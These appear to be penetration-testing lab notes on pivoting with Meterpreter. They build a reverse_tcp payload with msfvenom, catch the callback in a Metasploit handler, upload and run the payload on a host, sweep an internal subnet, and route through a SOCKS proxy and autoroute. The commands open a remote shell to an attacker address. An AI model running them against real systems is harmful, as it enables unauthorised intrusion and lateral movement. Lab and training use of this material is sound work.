# Meterpreter Port Forwarding

## Creating the Payload

```sh
my@attack:~$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.15.109 LPORT=8000 -f elf -o shell
```

## Configuring the Handler

```sh
my@attack:~$ msfconsole -q
```

```sh
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
msf6 exploit(multi/handler) > set LPORT 8000
msf6 exploit(multi/handler) > run
```

## Payload Transfer

### Uploading

```sh
my@attack:~$ scp shell ubuntu@10.129.15.50:/tmp
```

### Executing

```sh
ubuntu@WEB01:~$ chmod +x /tmp/shell
ubuntu@WEB01:~$ /tmp/shell
```

## Meterpreter Session Established

```sh
meterpreter > sysinfo
```

```output title="Output" hl_lines="2"
Computer     : 10.129.15.50
OS           : Ubuntu 20.04 (Linux 5.4.0-91-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
```

## Ping Sweep

```sh
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

## Ping Sweep (Pivot Host)

```sh
ubuntu@WEB01:~$ for i in $(seq 254); do ping "172.16.5.$i" -c 1 -W 1 & done | grep from
```

## SOCKS Proxy

```sh
meterpreter > background
msf6 exploit(multi/handler) > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
msf6 auxiliary(server/socks_proxy) > set VERSION 5
msf6 auxiliary(server/socks_proxy) > run
```

```output title="Output"
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
```

## [AutoRoute](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html#autoroute)

```sh
msf6 auxiliary(server/socks_proxy) > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
msf6 post(multi/manage/autoroute) > run
```

```output title="Output" hl_lines="3-4"
[*] Running module against 10.129.15.50
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.4.0/255.255.254.0 from host's routing table.
[*] Post module execution completed
```
